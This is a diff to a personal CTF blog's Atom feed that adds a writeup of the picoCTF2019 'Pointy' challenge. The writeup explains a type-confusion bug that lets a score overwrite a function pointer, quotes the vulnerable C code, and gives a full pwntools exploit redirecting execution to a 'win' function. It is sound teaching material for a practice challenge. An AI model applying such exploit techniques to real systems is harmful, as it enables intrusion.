@@ -1,5 +1,108 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://th3-5had0w.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://th3-5had0w.github.io/" rel="alternate" type="text/html" /><updated>2021-03-24T02:11:36+00:00</updated><id>https://th3-5had0w.github.io/feed.xml</id><title type="html">th3_5had0w</title><subtitle>Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i often solve math problems and play ctf!
-</subtitle><author><name>th3_5had0w</name></author><entry><title type="html">New blog</title><link href="https://th3-5had0w.github.io/2021/03/23/starting-my-new-blog.html" rel="alternate" type="text/html" title="New blog" /><published>2021-03-23T00:00:00+00:00</published><updated>2021-03-23T00:00:00+00:00</updated><id>https://th3-5had0w.github.io/2021/03/23/starting-my-new-blog</id><content type="html" xml:base="https://th3-5had0w.github.io/2021/03/23/starting-my-new-blog.html">&lt;p&gt;From today i will start writing on this blog of mine, i will post ctf writeups and math problem solves here, like my digital diary :D&lt;/p&gt;</content><author><name>th3_5had0w</name></author><category term="introduction" /><summary type="html">From today i will start writing on this blog of mine, i will post ctf writeups and math problem solves here, like my digital diary :D</summary></entry><entry><title type="html">dubblesort writeup</title><link href="https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html" rel="alternate" type="text/html" title="dubblesort writeup" /><published>2020-12-24T00:00:00+00:00</published><updated>2020-12-24T00:00:00+00:00</updated><id>https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup</id><content type="html" xml:base="https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html">&lt;h1 id=&quot;dubblesort-200pts-pwnabletw&quot;&gt;Dubblesort [200pts] (pwnable.tw)&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://th3-5had0w.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://th3-5had0w.github.io/" rel="alternate" type="text/html" /><updated>2021-03-24T02:24:45+00:00</updated><id>https://th3-5had0w.github.io/feed.xml</id><title type="html">th3_5had0w</title><subtitle>Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i often solve math problems and play ctf!
+</subtitle><author><name>th3_5had0w</name></author><entry><title type="html">New blog</title><link href="https://th3-5had0w.github.io/2021/03/23/starting-my-new-blog.html" rel="alternate" type="text/html" title="New blog" /><published>2021-03-23T00:00:00+00:00</published><updated>2021-03-23T00:00:00+00:00</updated><id>https://th3-5had0w.github.io/2021/03/23/starting-my-new-blog</id><content type="html" xml:base="https://th3-5had0w.github.io/2021/03/23/starting-my-new-blog.html">&lt;p&gt;From today i will start writing on this blog of mine, i will post ctf writeups and math problem solves here, like my digital diary :D&lt;/p&gt;</content><author><name>th3_5had0w</name></author><category term="introduction" /><summary type="html">From today i will start writing on this blog of mine, i will post ctf writeups and math problem solves here, like my digital diary :D</summary></entry><entry><title type="html">Pointy writeup [picoCTF2019]</title><link href="https://th3-5had0w.github.io/2021/03/10/pointy-writeup.html" rel="alternate" type="text/html" title="Pointy writeup [picoCTF2019]" /><published>2021-03-10T00:00:00+00:00</published><updated>2021-03-10T00:00:00+00:00</updated><id>https://th3-5had0w.github.io/2021/03/10/pointy-writeup</id><content type="html" xml:base="https://th3-5had0w.github.io/2021/03/10/pointy-writeup.html">&lt;h1 id=&quot;pointy-picoctf2019&quot;&gt;Pointy (picoCTF2019)&lt;/h1&gt;
+
+&lt;h4 id=&quot;what-does-this-program-do&quot;&gt;What does this program do?&lt;/h4&gt;
+
+&lt;h4 id=&quot;it-will-make-a-loop-which-will&quot;&gt;It will make a loop which will:&lt;/h4&gt;
+
+&lt;h4 id=&quot;1-create-a-new-student-struct-and-ask-for-student-name&quot;&gt;1. Create a new student struct and ask for student name&lt;/h4&gt;
+
+&lt;h4 id=&quot;2-create-a-new-professor-struct-and-ask-for-professer-name&quot;&gt;2. Create a new professor struct and ask for professer name&lt;/h4&gt;
+
+&lt;h4 id=&quot;3-search-for-the-student-who-will-give-a-professor-some-point&quot;&gt;3. Search for the student who will give a professor some point&lt;/h4&gt;
+
+&lt;h4 id=&quot;4-search-for-the-professor-who-will-be-given-some-point-by-the-student-chosen-at-step-3&quot;&gt;4. Search for the professor who will be given some point by the student chosen at step 3&lt;/h4&gt;
+
+&lt;h4 id=&quot;5-give-the-professor-point&quot;&gt;5. Give the professor point&lt;/h4&gt;
+
+&lt;h4 id=&quot;we-could-clearly-see-there-are-some-bugs-in-vulnc-right-in-the-first-place&quot;&gt;We could clearly see there are some bugs in vuln.c right in the first place&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;int main (int argc, char **argv)
+{
+    while(ADRESSES_TAKEN&amp;lt;MAX_ADDRESSES-1){
+        printf(&quot;Input the name of a student\n&quot;);
+        struct Student* student = (struct Student*)malloc(sizeof(struct Student));
+        ADDRESSES[ADRESSES_TAKEN]=student;	//1: student struct was saved in ADDRESSES array
+        readLine(student-&amp;gt;name);
+        printf(&quot;Input the name of the favorite professor of a student \n&quot;);
+        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
+        ADDRESSES[ADRESSES_TAKEN+1]=professor;  //2: professer struct was also saved in ADDRESSES array
+        readLine(professor-&amp;gt;name);
+        student-&amp;gt;scoreProfessor=&amp;amp;giveScoreToProfessor; //3: student-&amp;gt;scoreProfessor is a function pointer point to giveScoreToProfessor
+        ADRESSES_TAKEN+=2;
+        printf(&quot;Input the name of the student that will give the score \n&quot;);
+        char  nameStudent[NAME_SIZE];
+        readLine(nameStudent);
+        student=(struct Student*) retrieveStudent(nameStudent);
+        printf(&quot;Input the name of the professor that will be scored \n&quot;);
+        char nameProfessor[NAME_SIZE];
+        readLine(nameProfessor);
+        professor=(struct Professor*) retrieveProfessor(nameProfessor); //4: struct professor's change depends on retrieveProfessor function
+        puts(professor-&amp;gt;name);
+        unsigned int value;
+            printf(&quot;Input the score: \n&quot;);
+            scanf(&quot;%u&quot;, &amp;amp;value);
+        student-&amp;gt;scoreProfessor(professor, value); //5: point will be given through function scoreProfessor
+    }
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&quot;we-can-now-sense-some-buggy-smell-throught-that-5-place&quot;&gt;We can now sense some buggy smell throught that 5 place&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;struct Professor {
+    char name[NAME_SIZE];
+    int lastScore;
+};
+
+struct Student {
+    char name[NAME_SIZE];
+    void (*scoreProfessor)(struct Professor*, int);
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&quot;the-offset-of-student-scoreprofessor-is-the-same-as-professor-lastscore&quot;&gt;The offset of Student-&amp;gt;scoreProfessor is the same as Professor-&amp;gt;lastScore&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void* retrieveProfessor(char * name ){
+    for(int i=0; i&amp;lt;ADRESSES_TAKEN;i++){
+        if( strncmp(((struct Student*)ADDRESSES[i])-&amp;gt;name, name ,NAME_SIZE )==0){
+            return ADDRESSES[i];
+        }
+    }
+    puts(&quot;person not found... see you!&quot;);
+    exit(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&quot;the-struct-student-and-professor-are-on-the-same-array-but-this-retrieveprofessor-doesnt-check-for-name-if-the-professor-has-the-same-name-as-the-student-this-is-the-critical-bug&quot;&gt;The struct student and professor are on the same array, but this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;retrieveProfessor&lt;/code&gt; doesnt check for name if the professor has the same name as the student, this is the critical bug!&lt;/h4&gt;
+&lt;h4 id=&quot;so-now-if-we-input-a-as-the-student-name-a-as-the-professor-name-a-for-the-student-that-will-give-score-bypass-the-program-check&quot;&gt;So now if we input &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; as the student name, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; as the professor name, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; for the student that will give score (bypass the program check).&lt;/h4&gt;
+&lt;h4 id=&quot;and-finally-a-as-the-professor-name-the-retrieveprofessor-will-now-try-to-search-professor-named-a-but-the-student-named-a-is-at-the-first-index-of-the-array-so-the-program-will-give-the-professor--struct-variable-the-student-struct-and-then-because-the-offset-of-student-scoreprofessor-is-the-same-as-professor-lastscore-the-program-will-change-the-function-pointer-student-scoreprofessor-to-the-number-of-point-this-was-performed-in-givescoretoprofessor-function-of-struct-student&quot;&gt;And finally &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; as the professor name, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;retrieveProfessor&lt;/code&gt; will now try to search professor named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; but the student named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; is at the first index of the array, so the program will give the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;professor&lt;/code&gt;  struct variable the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;student&lt;/code&gt; struct, and then because the offset of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Student-&amp;gt;scoreProfessor&lt;/code&gt; is the same as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Professor-&amp;gt;lastScore&lt;/code&gt;, the program will change the function pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Student-&amp;gt;scoreProfessor&lt;/code&gt; to the number of point, this was performed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;giveScoreToProfessor&lt;/code&gt; function of struct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;student&lt;/code&gt;.&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void giveScoreToProfessor(struct Professor* professor, int score){
+    professor-&amp;gt;lastScore=score; // professor-&amp;gt;lastScore is actually student-&amp;gt;scoreProfessor because the program chose the student struct as professor struct and professor-&amp;gt;lastScore is the same offset as student-&amp;gt;scoreProfessor
+    printf(&quot;Score Given: %d \n&quot;, score);
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And i got this final exploit:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./vuln'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./vuln'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;givescore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;student&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;teacher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StudentGiveScore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;teacherBeingGivenScore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;student&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;teacher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StudentGiveScore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;teacherBeingGivenScore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;givescore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'win'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;givescore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lmao'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'bruh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'bruh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>th3_5had0w</name></author><category term="pwn" /><category term="picoCTF2019" /><summary type="html">Pointy (picoCTF2019)</summary></entry><entry><title type="html">dubblesort writeup [pwnable.tw]</title><link href="https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html" rel="alternate" type="text/html" title="dubblesort writeup [pwnable.tw]" /><published>2020-12-24T00:00:00+00:00</published><updated>2020-12-24T00:00:00+00:00</updated><id>https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup</id><content type="html" xml:base="https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html">&lt;h1 id=&quot;dubblesort-200pts-pwnabletw&quot;&gt;Dubblesort [200pts] (pwnable.tw)&lt;/h1&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;Sort the memory!&lt;/p&gt;
